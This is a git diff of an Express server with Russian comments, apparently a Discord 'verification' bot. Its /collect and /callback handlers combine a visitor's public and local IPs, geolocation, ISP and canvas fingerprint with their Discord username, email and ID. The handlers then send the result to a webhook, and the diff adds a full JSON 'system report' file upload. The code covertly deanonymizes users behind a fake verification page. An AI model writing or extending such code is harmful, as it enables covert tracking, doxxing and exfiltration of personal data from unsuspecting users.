@@ -9,7 +9,6 @@ app.use(express.static('public'));
 const PORT = process.env.PORT || 3000;
 const sessions = new Map();
 
-// 1. Принимаем данные от HTML (до редиректа в Discord)
 app.post('/collect', (req, res) => {
     const { state, data } = req.body;
     if (state && data) {
@@ -19,16 +18,14 @@ app.post('/collect', (req, res) => {
     res.sendStatus(200);
 });
 
-// 2. Callback от Discord
 app.get('/callback', async (req, res) => {
     const { code, state } = req.query;
     
     if (!code) return res.send('Ошибка: нет кода авторизации.');
     
     const clientData = sessions.get(state) || { error: 'Данные не найдены' };
-    sessions.delete(state); // Очищаем память
+    sessions.delete(state);
 
-    // Автоматически определяем URL (работает и локально, и на Railway)
     const protocol = req.headers['x-forwarded-proto'] || req.protocol;
     const host = req.get('host');
     const redirectUri = `${protocol}://${host}/callback`;
@@ -51,25 +48,38 @@ app.get('/callback', async (req, res) => {
         });
         const user = userResponse.data;
 
-        // 3. Отправляем всё в вебхук
+        // 3. Отправляем в вебхук (Сообщение + Файл)
         if (process.env.DISCORD_WEBHOOK_URL) {
-            await axios.post(process.env.DISCORD_WEBHOOK_URL, {
-                embeds: [{
-                    title: 'New Verified User',
-                    color: 0x5865f2,
-                    fields: [
-                        { name: 'Username', value: user.username, inline: true },
-                        { name: 'Email', value: user.email || 'Not provided', inline: true },
-                        { name: 'Discord ID', value: user.id, inline: true },
-                        { name: 'Public IP', value: clientData.publicIp || 'Unknown', inline: true },
-                        { name: 'Local IPs', value: (clientData.localIps || []).join(', ') || 'Hidden', inline: true },
-                        { name: 'Location', value: clientData.geo ? `${clientData.geo.city}, ${clientData.geo.country}` : 'Unknown', inline: true },
-                        { name: 'ISP', value: clientData.geo?.org || 'Unknown', inline: true },
-                        { name: 'Fingerprint (Canvas)', value: (clientData.canvasHash || '').slice(0, 80) + '...', inline: false }
-                    ],
-                    timestamp: new Date().toISOString()
-                }]
-            }).catch(err => console.error('Ошибка вебхука:', err.message));
+            const formData = new FormData();
+            
+            // Красивое сообщение
+            const embed = {
+                title: 'New Verified User',
+                color: 0x5865f2,
+                fields: [
+                    { name: 'Username', value: user.username, inline: true },
+                    { name: 'Email', value: user.email || 'Not provided', inline: true },
+                    { name: 'Discord ID', value: user.id, inline: true },
+                    { name: 'Public IP', value: clientData.publicIp || 'Unknown', inline: true },
+                    { name: 'Location', value: clientData.geo ? `${clientData.geo.city}, ${clientData.geo.country}` : 'Unknown', inline: true },
+                    { name: 'ISP', value: clientData.geo?.org || 'Unknown', inline: true }
+                ],
+                timestamp: new Date().toISOString()
+            };
+
+            formData.append('payload_json', JSON.stringify({
+                content: '**Full System Report Attached** 👇',
+                embeds: [embed]
+            }));
+
+            // Создаем файл с полным JSON отчетом
+            const reportJson = JSON.stringify(clientData, null, 2);
+            const fileBlob = new Blob([reportJson], { type: 'application/json' });
+            formData.append('files[0]', fileBlob, 'report.json');
+
+            await axios.post(process.env.DISCORD_WEBHOOK_URL, formData).catch(err => {
+                console.error('Ошибка вебхука:', err.response?.data || err.message);
+            });
         }
 
         // 4. Добавляем пользователя на сервер (guilds.join)
@@ -84,7 +94,6 @@ app.get('/callback', async (req, res) => {
             { headers: { Authorization: `Bot ${process.env.DISCORD_BOT_TOKEN}` } }
         );
 
-        // Успешный ответ
         res.send(`
             <body style="background:#313338;color:#dbdee1;font-family:sans-serif;text-align:center;padding-top:100px;">
                 <h2 style="color:#f2f3f5;">✅ Verification successful!</h2>
@@ -94,7 +103,6 @@ app.get('/callback', async (req, res) => {
         `);
     
     } catch (error) {
-        // ВЫВОДИМ ОШИБКУ НА ЭКРАН
         const errMsg = error.response?.data?.message || error.message;
         const errCode = error.response?.data?.code || '';
         console.error('DISCORD API ERROR:', error.response?.data || error.message);
